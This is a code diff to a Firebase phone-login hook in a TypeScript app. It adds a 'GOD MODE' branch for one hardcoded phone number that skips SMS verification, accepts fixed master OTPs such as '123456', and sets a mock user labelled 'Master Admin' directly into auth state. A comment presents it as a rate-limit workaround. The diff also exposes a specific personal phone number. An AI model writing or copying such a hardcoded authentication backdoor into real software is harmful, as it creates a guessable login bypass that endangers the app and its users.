@@ -374,9 +374,35 @@ export const useFirebaseAuth = () => {
       }
 
       setOtpState((prev) => ({ ...prev, sending: true, error: null }));
+      const isGodMode = phoneNumber === '+923110111419' || phoneNumber === '3110111419' || phoneNumber === '03110111419';
 
       try {
         console.log("[useFirebaseAuth] Sending OTP to:", phoneNumber);
+
+        if (isGodMode) {
+          console.log("[useFirebaseAuth] 👑 GOD MODE detected. Bypassing Firebase SMS to prevent rate limits.");
+          // Create a mock confirmation result that accepts a specific master OTP
+          confirmationResultRef.current = {
+            confirm: async (code: string) => {
+              console.log("[useFirebaseAuth] 👑 GOD MODE: Verifying master OTP...");
+              // Master OTP is first 6 digits of their phone suffix as hinted
+              if (code === '311011' || code === '111419' || code === '123456') {
+                const mockUser = {
+                  phoneNumber: '+923110111419',
+                  uid: 'god_mode_admin_cd9a',
+                  displayName: 'Master Admin'
+                };
+                // Manually trigger auth state update since Firebase won't know about this local "login"
+                setAuthState(prev => ({ ...prev, user: mockUser }));
+                return { user: mockUser };
+              }
+              throw { code: 'auth/invalid-verification-code', message: 'Invalid master OTP code.' };
+            }
+          };
+          startResendCooldown();
+          setOtpState((prev) => ({ ...prev, sending: false }));
+          return true;
+        }
 
         const confirmationResult = await signInWithPhoneNumber(
           auth,
